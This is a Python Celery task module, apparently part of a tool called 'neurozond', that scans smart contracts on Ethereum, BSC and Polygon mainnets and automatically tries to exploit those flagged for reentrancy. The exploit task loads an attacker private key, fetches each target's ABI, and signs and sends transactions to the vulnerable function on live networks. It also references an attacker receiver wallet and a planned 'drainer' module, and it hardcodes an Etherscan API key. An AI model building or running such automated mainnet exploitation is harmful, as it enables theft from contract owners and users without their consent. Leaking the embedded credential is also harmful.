import os
import sys
import time
import logging
import redis
import requests # Added for API calls
import json # Added for parsing ABI JSON
from celery import shared_task
from celery.exceptions import Ignore
from typing import Dict, Any, Optional, List
from web3 import Web3
from web3.middleware import geth_poa_middleware # For POA chains like BSC, Polygon
from dotenv import load_dotenv
from eth_account import Account
from web3.exceptions import ContractLogicError, TransactionNotFound

# Ensure src directory is in Python path for imports
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

# Load environment variables from .env file
load_dotenv()

from src.celery_app import celery_app, REDIS_URL
from src.modules.web3_contract_analyzer import Web3ContractAnalyzer
# Import exploit/drainer modules later when needed for exploit_task
# from src.modules.web3_drainer import Web3Drainer

# Setup logger for tasks
logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')

# Initialize components (consider initializing them within the task or using singletons for efficiency)
# For simplicity now, initialize here or lazily inside tasks
try:
    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True)
    # Test connection
    redis_client.ping()
    logger.info(f"Connected to Redis at {REDIS_URL} for task state management.")
except redis.exceptions.ConnectionError as e:
    logger.error(f"Failed to connect to Redis at {REDIS_URL}: {e}")
    # Depending on requirements, either exit or allow tasks to run without Redis state checks
    redis_client = None

# Set name for Redis set tracking processed contracts
PROCESSED_CONTRACTS_SET = "neurozond:processed_contracts"
EXPLOITED_CONTRACTS_SET = "neurozond:exploited_contracts" # Новый сет для отслеживания попыток эксплуатации

# Initialize Analyzer (could be done per task call if state needs isolation)
# Be mindful of resource usage if creating many analyzer instances
# Consider passing configuration path if needed
contract_analyzer = Web3ContractAnalyzer() 

# --- Configuration ---
ATTACKER_PRIVATE_KEY = os.getenv("ATTACKER_PRIVATE_KEY")
ATTACKER_RECEIVER_WALLET = os.getenv("ATTACKER_RECEIVER_WALLET")
RPC_URLS = {
    "ethereum:mainnet": os.getenv("ETH_MAINNET_RPC"),
    "bsc:mainnet": os.getenv("BSC_MAINNET_RPC"),
    "polygon:mainnet": os.getenv("POLYGON_MAINNET_RPC"),
    # Add more network mappings as needed
}
# --- API Keys for Block Explorers ---
# Используем ключ Etherscan, предоставленный пользователем в этой сессии
etherscan_api_key_session = "EZBH4X9WZST43KKVDQTNXY9KFDZV372RQZ"
EXPLORER_API_KEYS = {
    "ethereum": etherscan_api_key_session if etherscan_api_key_session else os.getenv("ETHERSCAN_API_KEY"), # Приоритет сессионному ключу
    "bsc": os.getenv("BSCSCAN_API_KEY"),
    "polygon": os.getenv("POLYGONSCAN_API_KEY"),
    # Add more explorer keys as needed
}
EXPLORER_API_URLS = {
    "ethereum:mainnet": "https://api.etherscan.io/api",
    "bsc:mainnet": "https://api.bscscan.com/api",
    "polygon:mainnet": "https://api.polygonscan.com/api",
    # Add more explorer URLs as needed
}

# --- Input Validation ---
if not ATTACKER_PRIVATE_KEY:
    logger.critical("ATTACKER_PRIVATE_KEY not found in environment variables. Exploitation task cannot run.")
    # Depending on setup, might raise an exception or disable the task
if not ATTACKER_RECEIVER_WALLET:
    logger.warning("ATTACKER_RECEIVER_WALLET not found in environment variables. Draining might fail.")
# Add checks for RPC URLs if needed
# Check if at least some API keys/URLs are configured
if not any(EXPLORER_API_KEYS.values()) or not any(EXPLORER_API_URLS.values()):
    logger.warning("Block explorer API keys or URLs are not configured in .env. ABI fetching will likely fail.")

# --- Helper to get Web3 instance ---
def get_web3_instance(chain: str, network: str) -> Optional[Web3]:
    """Gets a Web3 instance for the specified chain and network."""
    network_key = f"{chain}:{network}"
    rpc_url = RPC_URLS.get(network_key)
    if not rpc_url:
        logger.error(f"RPC URL for {network_key} not configured.")
        return None

    w3 = Web3(Web3.HTTPProvider(rpc_url))

    # Inject POA middleware for chains that need it (e.g., BSC, Polygon)
    if chain in ["bsc", "polygon"]: # Add other POA chains if necessary
        w3.middleware_onion.inject(geth_poa_middleware, layer=0)

    if not w3.is_connected():
        logger.error(f"Failed to connect to Web3 provider at {rpc_url}")
        return None

    logger.debug(f"Web3 instance created for {network_key}")
    return w3

# --- Helper to Fetch ABI ---
def fetch_abi_from_explorer(contract_address: str, chain: str, network: str) -> Optional[List[Dict[str, Any]]]:
    """Fetches the contract ABI from the relevant block explorer API."""
    network_key = f"{chain}:{network}"
    api_url = EXPLORER_API_URLS.get(network_key)
    api_key = EXPLORER_API_KEYS.get(chain) # Chain-level key usually

    if not api_url:
        logger.error(f"Block explorer API URL for {network_key} not configured.")
        return None
    # API key might be optional for some explorers/endpoints, but usually needed
    if not api_key:
         logger.warning(f"Block explorer API key for {chain} not configured. ABI fetching might fail.")
         # Continue without key for now, API might allow it

    params = {
        'module': 'contract',
        'action': 'getabi',
        'address': contract_address,
        'apikey': api_key
    }

    try:
        logger.debug(f"Fetching ABI for {contract_address} from {api_url}")
        response = requests.get(api_url, params=params, timeout=15) # Add timeout
        response.raise_for_status()  # Raise HTTPError for bad responses (4xx or 5xx)

        data = response.json()

        if data.get('status') == '1' and data.get('message') == 'OK':
            abi_string = data.get('result')
            if abi_string:
                 # The ABI is often returned as a JSON string, needs parsing
                 try:
                     abi = json.loads(abi_string)
                     logger.info(f"Successfully fetched ABI for {contract_address} from {network_key}")
                     return abi
                 except json.JSONDecodeError:
                     logger.error(f"Failed to parse ABI JSON for {contract_address}. Response: {abi_string}")
                     return None
            else:
                 logger.warning(f"ABI not found for {contract_address} on {network_key} via API (Result was empty). Contract might not be verified.")
                 return None
        else:
            # Handle API-specific errors (e.g., rate limits, invalid address)
            error_message = data.get('result') or data.get('message', 'Unknown API error')
            logger.error(f"API error fetching ABI for {contract_address} on {network_key}: {error_message}")
            return None

    except requests.exceptions.RequestException as e:
        logger.error(f"Network error fetching ABI for {contract_address}: {e}")
        return None
    except Exception as e:
        logger.error(f"Unexpected error fetching ABI for {contract_address}: {e}", exc_info=True)
        return None

@shared_task(bind=True, max_retries=3, default_retry_delay=60) # bind=True gives access to self (task instance)
def analyze_contract_task(self, contract_address: str, chain: str, network: str, source_code: Optional[str] = None):
    """Celery task to analyze a single smart contract."""
    logger.info(f"[Task {self.request.id}] Received analysis task for {contract_address} on {chain}/{network}")
    
    # Use a unique identifier for the contract across networks if necessary
    contract_id = f"{chain}:{network}:{contract_address.lower()}"
    
    # 1. Check if already processed (using Redis set)
    if redis_client:
        try:
            if redis_client.sismember(PROCESSED_CONTRACTS_SET, contract_id):
                logger.info(f"[Task {self.request.id}] Contract {contract_id} already processed. Skipping.")
                # Ignore the task - don't retry, just discard
                # If using Celery results backend, this won't store a result
                raise Ignore()
        except redis.exceptions.ConnectionError as e:
             logger.error(f"[Task {self.request.id}] Redis connection error checking processed set: {e}. Proceeding without check.")
        except Exception as e:
             logger.error(f"[Task {self.request.id}] Error checking Redis processed set: {e}. Proceeding without check.")

    # 2. Perform analysis
    try:
        # Note: analyze_contract expects source_code or address. 
        # If only address is provided, it might need logic to fetch source code (e.g., via Etherscan API)
        # The current SmartContractAnalyzer fetches balance/bytecode but relies on provided source_code for Slither analysis.
        # We might need to enhance it or add a step here to fetch source code if missing.
        logger.info(f"[Task {self.request.id}] Analyzing contract {contract_id}...")
        analysis_results = contract_analyzer.analyze_contract(
            contract_address=contract_address,
            source_code=source_code 
            # Potentially pass chain/network info if analyzer needs it
        )
        logger.info(f"[Task {self.request.id}] Analysis complete for {contract_id}. Found {len(analysis_results.get('vulnerabilities', []))} vulnerabilities.")
        
        # *** ИЗМЕНЕНИЕ: Добавляем логику вызова exploit_task ***
        # Условно определяем, является ли контракт эксплуатируемым
        # В реальности это должно быть частью логики analyze_contract
        is_exploitable = False
        exploit_details = {}
        if analysis_results.get("vulnerabilities"): # Если есть уязвимости
            # Простая симуляция: считаем эксплуатируемой первую найденную reentrancy
             for vuln in analysis_results["vulnerabilities"]:
                 if vuln.get("type") == "reentrancy" and vuln.get("confidence", "low") in ["high", "medium"]:
                    is_exploitable = True
                    exploit_details = {
                        "type": "reentrancy",
                        "target_function": vuln.get("function", "unknown"),
                        "confidence": vuln.get("confidence"),
                        "description": vuln.get("description", "N/A") # Pass description too
                    }
                    logger.info(f"[Task {self.request.id}] Contract {contract_id} identified as potentially exploitable (Reentrancy). Triggering exploit task.")
                    break # Берем первую найденную
        # *** КОНЕЦ ИЗМЕНЕНИЯ ***

        # Добавляем флаг эксплуатируемости в результат для информации
        analysis_results['exploitable_flag'] = is_exploitable

        # 3. Store results (e.g., log, send to another queue, save to DB)
        # For now, we return the result to the Celery backend (Redis)
        
        # 4. Mark as processed in Redis
        if redis_client and 'error' not in analysis_results:
            try:
                redis_client.sadd(PROCESSED_CONTRACTS_SET, contract_id)
                logger.debug(f"[Task {self.request.id}] Marked {contract_id} as processed in Redis.")
            except redis.exceptions.ConnectionError as e:
                logger.error(f"[Task {self.request.id}] Redis connection error marking as processed: {e}. State might be inconsistent.")
            except Exception as e:
                 logger.error(f"[Task {self.request.id}] Error marking as processed in Redis: {e}. State might be inconsistent.")

        # *** ИЗМЕНЕНИЕ: Вызываем exploit_task если нужно ***
        if is_exploitable:
            # Запускаем задачу эксплуатации асинхронно
            exploit_contract_task.delay(
                contract_address=contract_address,
                chain=chain,
                network=network,
                vulnerability_details=exploit_details
            )
        # *** КОНЕЦ ИЗМЕНЕНИЯ ***

        return analysis_results

    except Exception as exc:
        logger.error(f"[Task {self.request.id}] Analysis failed for {contract_id}: {exc}", exc_info=True)
        # Retry the task on failure (up to max_retries)
        # The task instance (`self`) is available because of `bind=True`
        try:
             self.retry(exc=exc)
        except self.MaxRetriesExceededError:
             logger.critical(f"[Task {self.request.id}] Max retries exceeded for contract {contract_id}. Giving up.")
             # Potentially send to a dead-letter queue or log permanently
             return {"error": f"Analysis failed after multiple retries: {exc}"} # Return error after max retries

# --- Обновленная задача эксплуатации с получением ABI и базовой транзакцией ---
@shared_task(bind=True, max_retries=2, default_retry_delay=120) # Даем меньше попыток на эксплойт
def exploit_contract_task(self, contract_address: str, chain: str, network: str, vulnerability_details: Dict[str, Any]):
    """Celery task to attempt exploitation based on analysis results."""
    contract_id = f"{chain}:{network}:{contract_address.lower()}"
    exploit_type = vulnerability_details.get('type', 'unknown')
    target_func_name = vulnerability_details.get('target_function', 'unknown') # Name might be inaccurate without ABI initially
    logger.info(f"[Task {self.request.id}] Received exploitation task for {contract_id} (Type: {exploit_type}, Target Hint: {target_func_name})")

    # --- Basic input validation ---
    if not ATTACKER_PRIVATE_KEY:
         logger.error(f"[Task {self.request.id}] Attacker private key missing.")
         return {"status": "config_error", "message": "Attacker private key missing."}
    if not ATTACKER_RECEIVER_WALLET:
        logger.warning(f"[Task {self.request.id}] Attacker receiver wallet missing.")
        # Decide if this is critical or only for draining step later

    # --- Check Redis ---
    if redis_client:
        try:
            if redis_client.sismember(EXPLOITED_CONTRACTS_SET, contract_id):
                logger.warning(f"[Task {self.request.id}] Exploit attempt for {contract_id} already logged. Skipping.")
                raise Ignore()
        except Exception as e: logger.error(f"[Task {self.request.id}] Redis error checking exploited set: {e}.")

    # --- Initialize Web3 & Attacker Account ---
    w3 = get_web3_instance(chain, network)
    if not w3: return {"status": "web3_error", "message": f"Failed to connect to {chain}:{network}"}
    try:
        attacker_account = Account.from_key(ATTACKER_PRIVATE_KEY)
        attacker_address = attacker_account.address
        logger.info(f"[Task {self.request.id}] Attacker wallet loaded: {attacker_address}")
    except Exception as e:
        logger.error(f"[Task {self.request.id}] Invalid attacker private key: {e}")
        return {"status": "config_error", "message": "Invalid attacker private key."}

    # --- Initialize Result ---
    exploit_result = {
        "status": "pending",
        "contract_id": contract_id,
        "exploit_type": exploit_type,
        "details": vulnerability_details,
        "abi_source": None,
        "tx_hash": None,
        "profit_wei": 0,
        "error_message": None,
    }

    # --- Fetch ABI ---
    contract_abi = fetch_abi_from_explorer(contract_address, chain, network)
    if not contract_abi:
        logger.error(f"[Task {self.request.id}] Failed to fetch ABI for {contract_address}. Cannot proceed with exploit.")
        exploit_result["status"] = "abi_fetch_failed"
        exploit_result["error_message"] = "Failed to retrieve ABI from block explorer."
        # Mark as attempted even if ABI fetch fails to avoid retrying indefinitely
        if redis_client: redis_client.sadd(EXPLOITED_CONTRACTS_SET, contract_id)
        return exploit_result
    else:
        exploit_result["abi_source"] = "block_explorer"

    # --- Implement Exploit Logic ---
    try:
        checksum_address = Web3.to_checksum_address(contract_address)
        target_contract = w3.eth.contract(address=checksum_address, abi=contract_abi)
        logger.info(f"[Task {self.request.id}] Instantiated contract object for {contract_address}")

        if exploit_type == "reentrancy":
            logger.warning(f"[Task {self.request.id}] Attempting Reentrancy exploit for {contract_id} on function hint '{target_func_name}'")

            # --- БАЗОВАЯ ЛОГИКА ВЗАИМОДЕЙСТВИЯ (Reentrancy) ---
            # This is highly simplified. Real reentrancy requires a malicious contract.
            # Here, we just try to call the vulnerable function identified by Slither.
            # We assume it's a withdraw/transfer function for demonstration.

            # 1. Find the function in the ABI (Slither's name might be partial/mangled)
            #    A better approach would be to get precise function signature from Slither if possible.
            #    For now, we crudely search by name hint.
            vulnerable_function = None
            for item in contract_abi:
                if item.get('type') == 'function' and target_func_name in item.get('name', ''):
                    vulnerable_function = target_contract.functions[item.get('name')]
                    logger.info(f"Found potential vulnerable function in ABI: {item.get('name')}")
                    break

            if not vulnerable_function:
                logger.error(f"[Task {self.request.id}] Could not find function matching hint '{target_func_name}' in the fetched ABI.")
                exploit_result["status"] = "exploit_failed"
                exploit_result["error_message"] = f"Target function hint '{target_func_name}' not found in ABI."
            else:
                # 2. Try calling the function (assuming no arguments or simple ones for demo)
                #    Real exploit needs specific parameters and potentially a malicious callback contract.
                try:
                    logger.info(f"Attempting to build transaction for function: {vulnerable_function.fn_name}")
                    # Estimate gas (important!)
                    # We might need to pass a value if it's payable withdraw. Simulate 0.01 ETH deposit/withdraw?
                    # Simplified: Assume function takes no args and isn't payable for this basic test
                    estimated_gas = vulnerable_function().estimate_gas({'from': attacker_address})

                    tx_params = {
                        'from': attacker_address,
                        'gas': estimated_gas + 50000, # Add buffer
                        'gasPrice': w3.eth.gas_price,
                         'nonce': w3.eth.get_transaction_count(attacker_address),
                         # 'value': w3.to_wei(0.01, 'ether') # Add if function is payable and needs value
                    }

                    transaction = vulnerable_function().build_transaction(tx_params)

                    logger.info(f"Signing transaction for {vulnerable_function.fn_name}...")
                    signed_tx = w3.eth.account.sign_transaction(transaction, private_key=ATTACKER_PRIVATE_KEY)

                    logger.info(f"Sending transaction...")
                    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
                    exploit_result["tx_hash"] = tx_hash.hex()
                    logger.info(f"Transaction sent: {exploit_result['tx_hash']}")

                    # 3. Wait for receipt (optional but good practice)
                    logger.info("Waiting for transaction receipt...")
                    # Use a reasonable timeout
                    receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)

                    if receipt.status == 1:
                        logger.info(f"Transaction successful (Status 1). Receipt: {receipt}")
                        exploit_result["status"] = "exploit_success_simulated" # Still simulated as real reentrancy is complex
                        # TODO: Calculate actual profit by comparing balances before/after or parsing events
                        exploit_result["profit_wei"] = 0 # Placeholder
                        exploit_result["message"] = f"Called {vulnerable_function.fn_name} successfully. Real profit calculation needed."

                    else: # Transaction failed (Status 0)
                        logger.error(f"Transaction failed (Status 0). Receipt: {receipt}")
                        exploit_result["status"] = "exploit_failed"
                        exploit_result["error_message"] = f"Transaction reverted (Status 0) when calling {vulnerable_function.fn_name}."

                except ContractLogicError as cle:
                     logger.error(f"Contract logic error calling {target_func_name}: {cle}", exc_info=True)
                     exploit_result["status"] = "exploit_failed"
                     exploit_result["error_message"] = f"Contract reverted: {cle}"
                except ValueError as ve: # Often related to gas estimation or invalid args
                     logger.error(f"Value error during transaction building/sending for {target_func_name}: {ve}", exc_info=True)
                     exploit_result["status"] = "exploit_failed"
                     exploit_result["error_message"] = f"Tx build/send error: {ve}"
                except TransactionNotFound:
                     logger.error(f"Transaction {exploit_result['tx_hash']} not found after timeout. Potentially dropped.")
                     exploit_result["status"] = "exploit_failed"
                     exploit_result["error_message"] = "Transaction potentially dropped or timed out."
                except Exception as call_exc:
                    logger.error(f"Unexpected error calling function {target_func_name}: {call_exc}", exc_info=True)
                    exploit_result["status"] = "exploit_failed"
                    exploit_result["error_message"] = f"Execution error: {call_exc}"

        # --- Add logic for other exploit types here ---
        elif exploit_type == "some_other_vulnerability":
             logger.warning(f"[Task {self.request.id}] Exploitation logic for {exploit_type} not yet implemented.")
             exploit_result["status"] = "not_implemented"
        else:
             logger.error(f"[Task {self.request.id}] Unknown or unsupported exploit type: {exploit_type}")
             exploit_result["status"] = "unknown_type"

    except Exception as e:
        logger.error(f"[Task {self.request.id}] Unexpected error during exploitation logic for {contract_id}: {e}", exc_info=True)
        exploit_result["status"] = "execution_error"
        exploit_result["error_message"] = f"General error: {str(e)}"


    # --- Log final result and mark as attempted ---
    logger.info(f"[Task {self.request.id}] Exploitation attempt final result for {contract_id}: Status='{exploit_result['status']}', TxHash='{exploit_result['tx_hash']}', Error='{exploit_result['error_message']}'")

    if redis_client:
        try:
            # Mark as attempted regardless of success/failure outcome from logic phase
            redis_client.sadd(EXPLOITED_CONTRACTS_SET, contract_id)
            logger.debug(f"[Task {self.request.id}] Marked {contract_id} as attempted exploitation in Redis.")
        except Exception as e:
            logger.error(f"[Task {self.request.id}] Redis error marking as exploited: {e}.")

    return exploit_result

# --- Placeholder for Producer Tasks (if not handled elsewhere) ---
# Example: Task to monitor a block range
# @shared_task
# def monitor_block_range(start_block, end_block, chain, network):
#     logger.info(f"Monitoring blocks {start_block}-{end_block} on {chain}/{network}")
#     # Logic to get contracts deployed in this range
#     # For each contract: analyze_contract_task.delay(address, chain, network, source_code)
#     pass 